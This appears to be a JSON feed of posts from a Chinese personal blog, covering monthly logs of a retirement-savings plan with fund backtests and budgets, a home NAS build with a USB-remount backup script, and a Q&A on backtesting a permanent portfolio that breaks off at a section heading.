[{"content":"前言 最近A股持续低迷，如今A股从2900防守点变为了2800防守点，去年一年收益率是-1.08%，如果美股基金帮扶，已不知道惨成什么样子了，关于2024年市场是否能好，目前我也看了很多文章，有持有看涨的，有持有看跌的，也有位居中间的，但无论怎么说，至少这些文章里面都提到了现在市场属于低估的市场。\n虽然属于低估，但进场也要控制自己的欲望和贪婪，就像王家卫拍的电视剧《繁花》里面爷叔给宝总说的一句话：\n想发财，要贪婪！ 但是发大财，要懂得克制贪婪，驾驭贪婪\n最近自己持有的美股基金涨幅达到了最高9.22%，目前个人感觉算比较高的位置了，原本的策略主打一个稳。\n原本的策略比较稳妥，但整体来说资金还不够分散，并且行业、大小盘、海内外都有轮动的可能性，比如2023年沪深300的基金盈亏达到了-9.63%，而海外纳斯达克的基金盈亏达到了+9.22%，所以就调整了一下策略，新的策略当中加入更多的行业的基金，比如医药、消费等基金，并且大部分都是跟踪指数。\n对于数据，我自己写了一份回测的代码，2018年01月开始至2023年12月，初始资金1万元，每期投入5000元，现有的方案总投入资金：368250.0， 账户资金：412668.77， 盈亏资金：+44418.77， 盈亏率：+12.06%，买入手续费合计：377.03，卖出手续费合计：0.0，整体上属于美股一路高歌，A股一路低沉：\n而调证后的方案我加入了再平衡的测试，再平衡的阈值为5%，总投入资金：367595.59， 账户资金：411902.68， 盈亏资金：44307.08， 盈亏率：+12.05%，买入手续费合计：400.57，卖出手续费合计：54.40：\n看到上面的替换反而感觉还降低了0.01%的收益，但在这个过程当中，我发现了一个非常有趣的事情，当加入再平衡，并且设定在每当有基金超过了阈值5%、3%、1%，则触发再平衡的时候，这个时候收益居然随着阈值的变小，收益逐渐在提高，三个阈值设定后，收益分别为5%收益为+12.05%，3%收益为+12.87%，1%收益为+13.03%。\n而我对现有的方案进行测试的时候，在再平衡阈值为3%的时候，新组合策略已经开始超过现有组合策略0.15%左右了，说明因为资金分散在不同的行业指数，不同基金之间存在大小盘、指数、风格、行业等因素的轮动，让再平衡实现了高抛低买的额外收益。\n在没有做这个测试之前，我还一直对于频繁的再平衡持有怀疑态度，但如今测试过后发现《机构投资的创新之路》一书和也谈钱也大提到的关于耶鲁大学基金偏离0.1的情况下都会进行再平衡的道理。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年5%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n本月的时间晚了一些，主要在对自己的组合策略进行调整之前，需要对数据进行回测，但回测不等于未来，回测只能参考，所以不作为投资建议。\n计划进度 当前极光计划完成度 0.2264%（当前资产 ÷ 目标资产），浮亏 195.96 元。\n预算及储蓄 2024年整体预算情况为：\n12月的储蓄率为53.64%：\n投资组合 投资组合12月份暂时未变，但在1月份将购入更多的行业基金分散投资。\n愿望清单 本月在京东活动的时候入手了全效净化器，使用后明显感觉自己的老鼻炎病好多了，并且甲醛测量比较有效，在冬天开制热空调后，检查到甲醛上升，比较符合常理，后续随着使用，逐渐降低。\n","permalink":"https://wuyizhou.com/posts/aurora-project-5/","summary":"前言 最近A股持续低迷，如今A股从2900防守点变为了2800防守点，去年一年收益率是-1.08%，如果美股基金帮扶，已不知道惨成什么样子了，关于2024年市场是否能好，目前我也看了很多文章，有持有看涨的，有持有看跌的，也有位居中间的，但无论怎么说，至少这些文章里面都提到了现在市场属于低估的市场。\n虽然属于低估，但进场也要控制自己的欲望和贪婪，就像王家卫拍的电视剧《繁花》里面爷叔给宝总说的一句话：\n想发财，要贪婪！ 但是发大财，要懂得克制贪婪，驾驭贪婪\n最近自己持有的美股基金涨幅达到了最高9.22%，目前个人感觉算比较高的位置了，原本的策略主打一个稳。\n原本的策略比较稳妥，但整体来说资金还不够分散，并且行业、大小盘、海内外都有轮动的可能性，比如2023年沪深300的基金盈亏达到了-9.63%，而海外纳斯达克的基金盈亏达到了+9.22%，所以就调整了一下策略，新的策略当中加入更多的行业的基金，比如医药、消费等基金，并且大部分都是跟踪指数。\n对于数据，我自己写了一份回测的代码，2018年01月开始至2023年12月，初始资金1万元，每期投入5000元，现有的方案总投入资金：368250.0， 账户资金：412668.77， 盈亏资金：+44418.77， 盈亏率：+12.06%，买入手续费合计：377.03，卖出手续费合计：0.0，整体上属于美股一路高歌，A股一路低沉：\n而调证后的方案我加入了再平衡的测试，再平衡的阈值为5%，总投入资金：367595.59， 账户资金：411902.68， 盈亏资金：44307.08， 盈亏率：+12.05%，买入手续费合计：400.57，卖出手续费合计：54.40：\n看到上面的替换反而感觉还降低了0.01%的收益，但在这个过程当中，我发现了一个非常有趣的事情，当加入再平衡，并且设定在每当有基金超过了阈值5%、3%、1%，则触发再平衡的时候，这个时候收益居然随着阈值的变小，收益逐渐在提高，三个阈值设定后，收益分别为5%收益为+12.05%，3%收益为+12.87%，1%收益为+13.03%。\n而我对现有的方案进行测试的时候，在再平衡阈值为3%的时候，新组合策略已经开始超过现有组合策略0.15%左右了，说明因为资金分散在不同的行业指数，不同基金之间存在大小盘、指数、风格、行业等因素的轮动，让再平衡实现了高抛低买的额外收益。\n在没有做这个测试之前，我还一直对于频繁的再平衡持有怀疑态度，但如今测试过后发现《机构投资的创新之路》一书和也谈钱也大提到的关于耶鲁大学基金偏离0.1的情况下都会进行再平衡的道理。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年5%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n本月的时间晚了一些，主要在对自己的组合策略进行调整之前，需要对数据进行回测，但回测不等于未来，回测只能参考，所以不作为投资建议。\n计划进度 当前极光计划完成度 0.2264%（当前资产 ÷ 目标资产），浮亏 195.96 元。\n预算及储蓄 2024年整体预算情况为：\n12月的储蓄率为53.64%：\n投资组合 投资组合12月份暂时未变，但在1月份将购入更多的行业基金分散投资。\n愿望清单 本月在京东活动的时候入手了全效净化器，使用后明显感觉自己的老鼻炎病好多了，并且甲醛测量比较有效，在冬天开制热空调后，检查到甲醛上升，比较符合常理，后续随着使用，逐渐降低。","title":"#5-极光计划实证：策略调整"},{"content":"前言 最近两个月A股反反复复，10月份跌破3000点后又回到了3000，最近又跌下去了，第二次跌破3000的我反而心态比一次更好了，所以说经历熊市才是最好的成长方式。\n但我仔细想过过这个事情，主要还是因为我投入的钱太少了，即使目前的钱全部亏完，最多心疼，但对于我目前来说造不成太大的心理伤害。\n最近在思考”长期持有“这句话，我个人最近一直再思考着这类的话，我个人觉得”长期持有“这句话没有问题，但很容易误导，让大家都觉得只要一直持有就会上涨，实际情况远比所谓的”长期持有“复杂，因为大家搞投资本质上不是只是看看上涨过过瘾，是来赚钱的，所以大部分例子中的回测都是拉到了很多年，实际上仔细一看，每年的波动非常大，如果不幸在高点，那么其他人5年可以浮盈达到15%，而你甚至还浮亏。\n之所以说这么多，其实最主要的问题还是想说”长期持有“是没有问题，但是一定是在基于”好价格+好资产+长期持有“，”有知有行“这样具备投顾服务特性的APP是完全没有问题的，只需要做好信任主理人，然后长期持有，因为投顾会在里面帮你去平衡整体的价格，比如有知有行的长钱钱包会在股市上行的时候卖掉部分权益类基金，转而去提升债权类基金。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1955%（当前资产 ÷ 目标资产），浮亏 133.73 元。\n预算及储蓄 2023年整体预算情况为：\n11月的储蓄率为59.477%。支出方面本月对比上月有所提高，超出的部分主要和家人出行游玩。从10月份开始调整了餐饮后，整体觉得目前是比较合适的。\n投资组合 愿望清单 最近家里面很早之前购买的小米净化器3传感器出现了问题，经常在睡觉的时候，转速自动调整为最大，导致吵闹得很，所以又将小米全效净化器恢复回来了。\n","permalink":"https://wuyizhou.com/posts/aurora-project-4/","summary":"前言 最近两个月A股反反复复，10月份跌破3000点后又回到了3000，最近又跌下去了，第二次跌破3000的我反而心态比一次更好了，所以说经历熊市才是最好的成长方式。\n但我仔细想过过这个事情，主要还是因为我投入的钱太少了，即使目前的钱全部亏完，最多心疼，但对于我目前来说造不成太大的心理伤害。\n最近在思考”长期持有“这句话，我个人最近一直再思考着这类的话，我个人觉得”长期持有“这句话没有问题，但很容易误导，让大家都觉得只要一直持有就会上涨，实际情况远比所谓的”长期持有“复杂，因为大家搞投资本质上不是只是看看上涨过过瘾，是来赚钱的，所以大部分例子中的回测都是拉到了很多年，实际上仔细一看，每年的波动非常大，如果不幸在高点，那么其他人5年可以浮盈达到15%，而你甚至还浮亏。\n之所以说这么多，其实最主要的问题还是想说”长期持有“是没有问题，但是一定是在基于”好价格+好资产+长期持有“，”有知有行“这样具备投顾服务特性的APP是完全没有问题的，只需要做好信任主理人，然后长期持有，因为投顾会在里面帮你去平衡整体的价格，比如有知有行的长钱钱包会在股市上行的时候卖掉部分权益类基金，转而去提升债权类基金。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1955%（当前资产 ÷ 目标资产），浮亏 133.73 元。\n预算及储蓄 2023年整体预算情况为：\n11月的储蓄率为59.477%。支出方面本月对比上月有所提高，超出的部分主要和家人出行游玩。从10月份开始调整了餐饮后，整体觉得目前是比较合适的。\n投资组合 愿望清单 最近家里面很早之前购买的小米净化器3传感器出现了问题，经常在睡觉的时候，转速自动调整为最大，导致吵闹得很，所以又将小米全效净化器恢复回来了。","title":"#4-极光计划实证：经历了熊市才算成长"},{"content":"前言 最近一个月算是第一次关注投资以来经历的第一次“小起小落”，上证下到了3000点以下，自己的基金也最高亏到了190元，目前仍然浮亏。\n为什么是小起小落呢？自己总结了一下，可能是两个原因，其一是因为自己投入资金并不多，其二可能投入的钱并不会影响到生活，所以也就不在乎了，但我自己臆想，应该第一种可能性较大。\n在上个月月底自己从小结伴的表姐被我一顿洗脑买了一部分基金，但整体不多闹着玩的投入了400-500元，但到了跌到3000点附近的时候，表姐给我发了一条消息，附上了一张截图（图片大概是某个网络博主说A股没有希望了），意思是要先撤退不玩了，也就是默认赞同了A股没有希望这一说。\n但好在平时关注了几个风格比较喜欢的博主，常被这些博主有理有据的“按摩”，反而到期待这个市场是怎么走向。\n对于市场不好的时候，我个人思路是A股越跌，优质资产就越多，毕竟“好价格+好资产+长期持有=高回报”，如果真正出现了A股一直跌，那么反正大家持有都为人民币，一直跌下去，也就是说明中国经济不行了，那么人民币也就会随之贬值，当然这种说法有点PUA，也不全无道理。\n上面这种思路，我记得橡树资本的创始人霍华德·马克斯（名字还是现查才记住）在《周期》一书中还应用到了投资当中，并且也获得了非常好的回报。\n最近在看也大的公众号连载《减重日记》系列，看了几期后，颠覆了平常对于减肥认知，同时也将《中国居民膳食指南》这本书加入了待看清单中，准备后面有时间了多了解了解。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1634%（当前资产 ÷ 目标资产），浮亏 96.49 元。\n预算及储蓄 2023年整体预算情况为：\n10月的储蓄率为39.85%，因给自己买入了重疾险，所以储蓄部分降低了。\n本月支出因为国庆节回老家，消费过高，导致分摊预算中一直存在一笔待摊销奋勇，正在逐月通过结余和购物预算进行分摊。\n本月日常餐饮结余的一部分正好填补了交通费超出的一部分，主要超出的部分在于外出打车，整体次数为5次。\n但通过此次实施的情况来看，交通费目前的预算是不太合理的，因为在日常生活中，即使自己有车的情况下，打车很难避免，所以准备在11月将其提高至900元。\n投资组合 投资组合本月没有变化。\n愿望清单 本月的愿望清单将Apple Watch S8购入了，这是因为最近看见也大发的公众号连载《减重日记》系列中提到对于长时间带Apple Watch可以通过健康应用找到“静息能量”和“活动能量”两个数据，这两个数据相加就可以代表当天消耗了多少卡路里，而这个值我觉得非常有用的地方在于，以前每天减肥不知道到底吃多少？只能按照能少吃则少吃的概念，但这个数据就提供了一个很好的参考。\n除此之外，加上Apple Watch 9出来了，Apple Watch8市场价格开始下降，正好看见我们一个做数码产品的朋友在出售一块二手的Apple Watch 8 45 GPS版本，价格1300，属于非常香的价格了。\n同时本月愿望清单中删除了小米智能电蒸锅，这个删除主要的原因在于产品的塑料问题，了解了一翻后发现这个产品的蒸盖是塑料的，所以暂时放弃了。\n关于净化器，目前和家人讨论了一番后，觉得似乎性价比不高，这是因为本质上散甲醛最好的方式还是通风，所以空气净化器的应用场景就只有在夏天、空调屋了，但四川这边马上进入冬天，实际上可以接受随时开着窗子，而冬天一过，我们整体的装修时间已经达到了小一年了，所以也就放弃了。\n","permalink":"https://wuyizhou.com/posts/aurora-project-3/","summary":"前言 最近一个月算是第一次关注投资以来经历的第一次“小起小落”，上证下到了3000点以下，自己的基金也最高亏到了190元，目前仍然浮亏。\n为什么是小起小落呢？自己总结了一下，可能是两个原因，其一是因为自己投入资金并不多，其二可能投入的钱并不会影响到生活，所以也就不在乎了，但我自己臆想，应该第一种可能性较大。\n在上个月月底自己从小结伴的表姐被我一顿洗脑买了一部分基金，但整体不多闹着玩的投入了400-500元，但到了跌到3000点附近的时候，表姐给我发了一条消息，附上了一张截图（图片大概是某个网络博主说A股没有希望了），意思是要先撤退不玩了，也就是默认赞同了A股没有希望这一说。\n但好在平时关注了几个风格比较喜欢的博主，常被这些博主有理有据的“按摩”，反而到期待这个市场是怎么走向。\n对于市场不好的时候，我个人思路是A股越跌，优质资产就越多，毕竟“好价格+好资产+长期持有=高回报”，如果真正出现了A股一直跌，那么反正大家持有都为人民币，一直跌下去，也就是说明中国经济不行了，那么人民币也就会随之贬值，当然这种说法有点PUA，也不全无道理。\n上面这种思路，我记得橡树资本的创始人霍华德·马克斯（名字还是现查才记住）在《周期》一书中还应用到了投资当中，并且也获得了非常好的回报。\n最近在看也大的公众号连载《减重日记》系列，看了几期后，颠覆了平常对于减肥认知，同时也将《中国居民膳食指南》这本书加入了待看清单中，准备后面有时间了多了解了解。\n实证 从2023年7月份开始，我开始实施退休计划，我将该计划称为“极光计划”，争取在45岁存够300万，然后每年7%的作为生活费过上退休的生活。\n实证记录我在每个月1-10号进行更新，主要记录上个月的情况。\n计划进度 当前极光计划完成度 0.1634%（当前资产 ÷ 目标资产），浮亏 96.49 元。\n预算及储蓄 2023年整体预算情况为：\n10月的储蓄率为39.85%，因给自己买入了重疾险，所以储蓄部分降低了。\n本月支出因为国庆节回老家，消费过高，导致分摊预算中一直存在一笔待摊销奋勇，正在逐月通过结余和购物预算进行分摊。\n本月日常餐饮结余的一部分正好填补了交通费超出的一部分，主要超出的部分在于外出打车，整体次数为5次。\n但通过此次实施的情况来看，交通费目前的预算是不太合理的，因为在日常生活中，即使自己有车的情况下，打车很难避免，所以准备在11月将其提高至900元。\n投资组合 投资组合本月没有变化。\n愿望清单 本月的愿望清单将Apple Watch S8购入了，这是因为最近看见也大发的公众号连载《减重日记》系列中提到对于长时间带Apple Watch可以通过健康应用找到“静息能量”和“活动能量”两个数据，这两个数据相加就可以代表当天消耗了多少卡路里，而这个值我觉得非常有用的地方在于，以前每天减肥不知道到底吃多少？只能按照能少吃则少吃的概念，但这个数据就提供了一个很好的参考。\n除此之外，加上Apple Watch 9出来了，Apple Watch8市场价格开始下降，正好看见我们一个做数码产品的朋友在出售一块二手的Apple Watch 8 45 GPS版本，价格1300，属于非常香的价格了。\n同时本月愿望清单中删除了小米智能电蒸锅，这个删除主要的原因在于产品的塑料问题，了解了一翻后发现这个产品的蒸盖是塑料的，所以暂时放弃了。\n关于净化器，目前和家人讨论了一番后，觉得似乎性价比不高，这是因为本质上散甲醛最好的方式还是通风，所以空气净化器的应用场景就只有在夏天、空调屋了，但四川这边马上进入冬天，实际上可以接受随时开着窗子，而冬天一过，我们整体的装修时间已经达到了小一年了，所以也就放弃了。","title":"#3-极光计划实证：小起小落"},{"content":"从两个月前，我着手搭建了一套家用Nas，起因之前自己的资料一直存放在ICloud，因为自己的资料比较多，在600多G，所以自己一直购买的国区2T，每个月68元，一年816元，也不算便宜了。再加上自己的资料和储存的数据越来越大，所以就有就有了这个需求。\n对于资料不多、储存量不大的用户，不建议使用Nas，使用自带的云储存足够了，自己组建Nas只有在一定储存量级，才会有价值，所以对于数据量少的朋友，看看就行了，别折腾了。\n同时自己电脑有两台，一台苹果笔记本，一台Windows笔记本，ICloud对于Windows系统同步是真的难用，甚至打开文件夹都会卡顿，所以也是其自己搭建Nas的一个小因素了。\n选购之前对比了多种方式，购买其他国内云储存服务、自己购买云主机自己搭建、购买成品NAS、自己搭组NAS。\n先说说前两者，国内云服务研究了一番后，排除了，具体原因暂时不好说。然后就是云主机搭建，后面研究一番发现不论国内还是国内的云主机，硬盘都贵得要死。\n再说说后两者，也是我纠结最久的，成品Nas的优点就是不用折腾、省心以及有技术服务支撑，缺点就是配置低、价格贵。自己组Nas的优点在于便宜、配置高，缺点就是折腾，也不省心。\n那作为以技术出身的人来说，自己组Nas的缺点到成了一个有趣的过程，而配置高也满足了技术人员常常的幻想”配置不够“这一假说。\n所以最终思考了一下，准备折腾一下自己，组建Nas就成了最优选择。\n选购 既然是自己组建，就得自己挑选硬件、考虑配置、选择系统，系统我选择的是群晖，也就是所谓的黑群晖，主要考虑到配套的软件足够好用，关于硬件选配，可以参考隔壁网这篇文章《2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.com)》。\n我的配置目前是：\nCPU：考虑到需要看电影做解码，所以选择了i3-8100T，然后带T属于低功耗，对于Nas来说也完全够用了。 内存：32G。 硬盘：8TB硬盘两块，用于存放资料、文件。16TB硬盘一块，用于存放电影。 主板：选择了大厂微星的Z370M Mortar。 机箱：Treasure宝藏盒，快700多的一个机箱了，已经算比较贵了，但是买回来看了一下外观，真香。 风扇：利民AXP90 电源：Flex台达250W电源 这里需要说一个事情，我没有配备缓存，群晖的系统可以配备2块M2 Nvme硬盘作为缓存组，可以用于读写缓存，单盘只能作为读缓存。我研究了一番后，决定还是不用缓存，第一个对于我这样的家用环境上缓存提升不大，也有很多家用小伙伴测试后发了相关的结论。第二个就是缓存可能导致故障，第三个性价比不高。\n系统 系统采用的是群晖，既然是自己搭建的，所以也就是所谓的黑群晖了，采用的引导是最简单的引导arpl-i18n，该引导是基于巴西大佬arpl的版本上改进的，对于两者我还真不知道差距在哪里，但只要好用，然后用的人多就行了。\n然后黑群晖的引导是需要一个U盘的，正常情况下U盘可以插在机箱前面或者后面，但是对于花了700多买了这么漂亮的机箱，U盘插在前后，犹如”一坨牛屎抹在鲜花上“。\n所以我就购买了一个主板的usb插座，然后将引导U盘插在上面，这样就可以把usb隐藏在机箱内了。\n备份 我的备份组合主要集中为四种，分别RAID1+Cloud Sync+Hyper Backup网盘+Hyper Backup硬盘，其中RAID1虽然说起来不算是”备份“方案，但本质提供冗余还是一种数据的保障，所以也就算了进来。\nHyper Backup则是提供了一个完整的套件、文件增量备份，每天执行一次。\nCloud Sync则是作为一个补充，提供一个实时的文件同步，将文件同步到我的Onedrive，至于为什么是Onedrive，第一个原因是支持，第二个原因是因为我每年要买Office365，所以有1TB的免费网盘容量。\nHyper Backup是目前我觉得最好的备份方案，Hyper Backup支持备份到云服务商、本地USB储存设备等方式。Hyper Backup我采用了两种方式，分别为阿里云盘通过Alist以WebDAV的方式挂载到本地，然后Hyper Backup选择WebDAV方式进行备份，好处在于阿里云盘服务器在国内比较稳定，关于如何通过查看Alist关于阿里云盘的文档。\n第二种方式，我采用的是本地USB插入硬盘的方式，这个方式有个好处在于能无限扩大备份目的地的容量，比如你可以通过一个硬盘盒做多个盘用USB接入，同时配置好了也比较省电省电。\n为什么说省电呢？在设置为USB为备份目的地的时候，配置可以选择，当备份完成后自动断开卸载USB，然后再加上硬盘盒的自动休眠，就可以在备份完成后的耗电降到最低，比如下图（因为我目前已经设置完成，所以找不到这个选项了，就借用了一张图片）。\n但这种方式有一个问题，就是你在下次备份的时候没有办法自动挂载，你需要通过定时任务，将在定时的自动备份任务开始之前将USB重新挂载好。\n重新挂载USB需要两个步骤，第一个步骤确定USB编号，需要打开群晖的SSH，然后进入到终端后使用lsusb命令，我找到我备份目的地的硬盘为2-3：\n第二个步骤是将如下代码放入群晖的任务计划，选择运行的用户为root（一定注意，卸载挂载外置设备需要root权限）：\n然后将如下代码放入脚本中，其中的2-3需要替换为备份的外置目的地设备编号。\necho 0 \u0026gt; /sys/bus/usb/devices/2-3/authorized echo 1 \u0026gt; /sys/bus/usb/devices/2-3/authorized 最后，设定好计划时间，我目前是在Hyper Backup之前的5分钟挂载。\n结尾 说完了后，说说成品Nas和自己搭建Nas推荐哪个，整体就是完全不建议没有技术或者不想折腾的人来自己搭建Nas，更建议直接买群晖或者其他厂商的成品Nas，对于有技术的用户，这种方式就挺推荐的。\n搭建到如今，也算是对稳定性比较信任了，将自己照片、文件都转移到了群晖，同时也说服了自己的爱人将手机照片转到了群晖，不得不说群晖的配套软件是真的好用，买软件送硬件也不是无道理，看来以后买一个白裙也不是不可以。\n参考文章 # Synology NAS 的 USB 外接硬碟在系統中的順序 / HyperBackup 備份後自動卸載該如何重新掛載 2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.com) ","permalink":"https://wuyizhou.com/posts/home-nas-2023/","summary":"从两个月前，我着手搭建了一套家用Nas，起因之前自己的资料一直存放在ICloud，因为自己的资料比较多，在600多G，所以自己一直购买的国区2T，每个月68元，一年816元，也不算便宜了。再加上自己的资料和储存的数据越来越大，所以就有就有了这个需求。\n对于资料不多、储存量不大的用户，不建议使用Nas，使用自带的云储存足够了，自己组建Nas只有在一定储存量级，才会有价值，所以对于数据量少的朋友，看看就行了，别折腾了。\n同时自己电脑有两台，一台苹果笔记本，一台Windows笔记本，ICloud对于Windows系统同步是真的难用，甚至打开文件夹都会卡顿，所以也是其自己搭建Nas的一个小因素了。\n选购之前对比了多种方式，购买其他国内云储存服务、自己购买云主机自己搭建、购买成品NAS、自己搭组NAS。\n先说说前两者，国内云服务研究了一番后，排除了，具体原因暂时不好说。然后就是云主机搭建，后面研究一番发现不论国内还是国内的云主机，硬盘都贵得要死。\n再说说后两者，也是我纠结最久的，成品Nas的优点就是不用折腾、省心以及有技术服务支撑，缺点就是配置低、价格贵。自己组Nas的优点在于便宜、配置高，缺点就是折腾，也不省心。\n那作为以技术出身的人来说，自己组Nas的缺点到成了一个有趣的过程，而配置高也满足了技术人员常常的幻想”配置不够“这一假说。\n所以最终思考了一下，准备折腾一下自己，组建Nas就成了最优选择。\n选购 既然是自己组建，就得自己挑选硬件、考虑配置、选择系统，系统我选择的是群晖，也就是所谓的黑群晖，主要考虑到配套的软件足够好用，关于硬件选配，可以参考隔壁网这篇文章《2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.com)》。\n我的配置目前是：\nCPU：考虑到需要看电影做解码，所以选择了i3-8100T，然后带T属于低功耗，对于Nas来说也完全够用了。 内存：32G。 硬盘：8TB硬盘两块，用于存放资料、文件。16TB硬盘一块，用于存放电影。 主板：选择了大厂微星的Z370M Mortar。 机箱：Treasure宝藏盒，快700多的一个机箱了，已经算比较贵了，但是买回来看了一下外观，真香。 风扇：利民AXP90 电源：Flex台达250W电源 这里需要说一个事情，我没有配备缓存，群晖的系统可以配备2块M2 Nvme硬盘作为缓存组，可以用于读写缓存，单盘只能作为读缓存。我研究了一番后，决定还是不用缓存，第一个对于我这样的家用环境上缓存提升不大，也有很多家用小伙伴测试后发了相关的结论。第二个就是缓存可能导致故障，第三个性价比不高。\n系统 系统采用的是群晖，既然是自己搭建的，所以也就是所谓的黑群晖了，采用的引导是最简单的引导arpl-i18n，该引导是基于巴西大佬arpl的版本上改进的，对于两者我还真不知道差距在哪里，但只要好用，然后用的人多就行了。\n然后黑群晖的引导是需要一个U盘的，正常情况下U盘可以插在机箱前面或者后面，但是对于花了700多买了这么漂亮的机箱，U盘插在前后，犹如”一坨牛屎抹在鲜花上“。\n所以我就购买了一个主板的usb插座，然后将引导U盘插在上面，这样就可以把usb隐藏在机箱内了。\n备份 我的备份组合主要集中为四种，分别RAID1+Cloud Sync+Hyper Backup网盘+Hyper Backup硬盘，其中RAID1虽然说起来不算是”备份“方案，但本质提供冗余还是一种数据的保障，所以也就算了进来。\nHyper Backup则是提供了一个完整的套件、文件增量备份，每天执行一次。\nCloud Sync则是作为一个补充，提供一个实时的文件同步，将文件同步到我的Onedrive，至于为什么是Onedrive，第一个原因是支持，第二个原因是因为我每年要买Office365，所以有1TB的免费网盘容量。\nHyper Backup是目前我觉得最好的备份方案，Hyper Backup支持备份到云服务商、本地USB储存设备等方式。Hyper Backup我采用了两种方式，分别为阿里云盘通过Alist以WebDAV的方式挂载到本地，然后Hyper Backup选择WebDAV方式进行备份，好处在于阿里云盘服务器在国内比较稳定，关于如何通过查看Alist关于阿里云盘的文档。\n第二种方式，我采用的是本地USB插入硬盘的方式，这个方式有个好处在于能无限扩大备份目的地的容量，比如你可以通过一个硬盘盒做多个盘用USB接入，同时配置好了也比较省电省电。\n为什么说省电呢？在设置为USB为备份目的地的时候，配置可以选择，当备份完成后自动断开卸载USB，然后再加上硬盘盒的自动休眠，就可以在备份完成后的耗电降到最低，比如下图（因为我目前已经设置完成，所以找不到这个选项了，就借用了一张图片）。\n但这种方式有一个问题，就是你在下次备份的时候没有办法自动挂载，你需要通过定时任务，将在定时的自动备份任务开始之前将USB重新挂载好。\n重新挂载USB需要两个步骤，第一个步骤确定USB编号，需要打开群晖的SSH，然后进入到终端后使用lsusb命令，我找到我备份目的地的硬盘为2-3：\n第二个步骤是将如下代码放入群晖的任务计划，选择运行的用户为root（一定注意，卸载挂载外置设备需要root权限）：\n然后将如下代码放入脚本中，其中的2-3需要替换为备份的外置目的地设备编号。\necho 0 \u0026gt; /sys/bus/usb/devices/2-3/authorized echo 1 \u0026gt; /sys/bus/usb/devices/2-3/authorized 最后，设定好计划时间，我目前是在Hyper Backup之前的5分钟挂载。\n结尾 说完了后，说说成品Nas和自己搭建Nas推荐哪个，整体就是完全不建议没有技术或者不想折腾的人来自己搭建Nas，更建议直接买群晖或者其他厂商的成品Nas，对于有技术的用户，这种方式就挺推荐的。\n搭建到如今，也算是对稳定性比较信任了，将自己照片、文件都转移到了群晖，同时也说服了自己的爱人将手机照片转到了群晖，不得不说群晖的配套软件是真的好用，买软件送硬件也不是无道理，看来以后买一个白裙也不是不可以。\n参考文章 # Synology NAS 的 USB 外接硬碟在系統中的順序 / HyperBackup 備份後自動卸載該如何重新掛載 2022年组建群晖实体机的一些建议 - 黑白群晖 - 隔壁网 (gebi1.","title":"最近搭建了一台家用Nas"},{"content":"前言 最近想了一个方式，找了一些基金的历史数据，并且做了一些回测，下面是我做了回测后在也大的知识星球上提出的提问以及也大回复的内容。\n也大，最近一直在思考实现你提到的Mini财务自由，我采集了2019年5月1日至2023年9月15日的数据，制作了两组永久组合的数据，分别为：\n黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：易方达中债1-3年国开债A(007169)。债券基金：易方达中债7-10年国开债A(003358)。 黄金基金：易方达黄金ETF(159934)。偏股基金：兴全合润混合LOF（163406）。货币基金：长城收益宝货币A(004972)。债券基金：招商产业债券A(217022) 上面两种主要验证也大之前提到的永久组合里面原书建议货币为短期国债、债券则为长期国债，这里用国开行的准国债作为国债，然后再根据也打原文章中提到的国内配置普通债券和货币基金即可，所以这里做了两组。\n参数情况为：\n当每个月的第一个交易日，自动追加1万资金，4个基金各25%。 每年2月10日，自动提取资金的7%和10%两种情况（7%和10%的区别，考虑了3%的通货膨胀） 初始资金1万元，4个基金各25%。 第一种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为107634，总收益为6.37%，提取后的收益为-13.93%。\n第一种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为77635，总收益为6.43%，提取后的收益为8.2%。\n第二种组合，在每年提取10%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为109550，总收益为8.02%，提取后的收益为-12.64%。 ![[fcba6de9b99ab585ad3816aa88c6bd49_MD5.png]]\n第二种组合，在每年提取7%的生活费的情况下，结果为总投入资金为530,000，总提取生活费为79044，总收益为8.17%，提取后的收益为-6.73%\n经过上面的数据验证，我有几个疑问需要想向也大请教：\n经过上面的数据测试，我理解的后一种方式应该属于可行，因为在经济很差的环境下只计算出亏损6.7%，不知道这样解读是不是有错误的认知？ 我理解的债券，大部分是属于企业债，在正常的环境下，债券涨股票跌，反之一样，我理解的属于正常的资金左右流动。但对于市场差的情况下，比如这几年大经济环境不好，两者都在跌，这样风险还是很高，这对于永久组合来说是不是有点反其道而行？ 对于上述数据，也大还有其他的见解吗？ 也大的回复为：\n为什么要选择永久组合作为被动收入的回测策略呢？ 如果想要 mini 版财务自由，思考的前提条件应该是【预期收益大于提款比率】，但永久组合本身的预期收益率不太可能达到 7%～10% 这样的收益。所以用永久组合来做这个回测感觉意义不是特别大，得出的结论也因此不太有参考性。 另外做回测还需要有意识地确定回测的起止时间，这一点对于永久组合的影响倒是不太大，因为组合本身比较平稳。但对于其他权益类投资占比更高，波动更大的投资，需要更仔细地选择回测的起止时间，起止点最好能涵盖一整轮牛熊。 我自己也做过一些回测，发现除了资产配置的比例，留有一定比例的备用金，在市场低估时期避免直接提取投资、伤害本金，也有利于改善长期收益：自由之路提前 2 年 思路供你参考 不过对于这样提出想法、数据验证的回测思路还是很点赞的，喜欢这样有理有据的思考 👍 可以问问是有什么回测工具吗？还是自己写的代卖？最后的数据图很漂亮～\n实证 